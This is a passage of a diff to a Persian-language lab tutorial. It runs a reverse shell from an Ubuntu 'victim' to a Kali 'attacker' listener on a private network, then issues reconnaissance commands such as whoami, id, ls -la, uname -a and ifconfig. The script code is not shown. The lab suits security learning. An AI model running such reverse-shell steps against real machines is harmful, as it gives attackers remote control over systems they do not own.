@@ -25,14 +25,69 @@ python3 attacker_kali.py
 
 #### خروجی مورد انتظار:
 
-```terminal
+```Terminal
 [*] Kali Linux Reverse Shell Server
 [*] Listening on 192.168.253.129:9999
 [*] Waiting for Ubuntu (192.168.253.128) to connect...
 ```
 
 
+#### مرحله 3: روی Ubuntu (قربانی)
+
+```bash
+# ۱. کد قربانی را اجرا کن
+python3 victim_ubuntu.py
+```
+
+باید این پیام را ببینی:
+```Terminal
+[*] Connecting to Kali Linux at 192.168.253.129:9999
+[+] Connected to attacker at 192.168.253.129
+```
+
+#### مرحله 4: برگرد به Kali
+روی Kali باید ببینی:
+
+```Terminal
+[+] Connection established from 192.168.253.128
+Ready for commands...
+kali@shell# 
+```
 
 
+#### مرحله 5: دستورات را امتحان کن
+روی Kali تایپ کن:
+```
+kali@shell# whoami
+```
+باید اسم کاربر Ubuntu را ببینی!
 
+#### 🎮 دستورات تست سریع:
+روی Kali این دستورات را یکی یکی امتحان کن:
+```bash
+kali@shell# id            # اطلاعات کاربر
+```
+<br>
 
+```bash
+kali@shell# pwd           # مسیر فعلی
+```
+<br>
+
+```bash
+kali@shell# ls -la        # فایل‌ها
+```
+<br>
+
+```bash
+kali@shell# uname -a      # اطلاعات سیستم
+```
+<br>
+
+```bash
+kali@shell# ifconfig      # شبکه Ubuntu
+```
+<br>
+
+```bash
+```
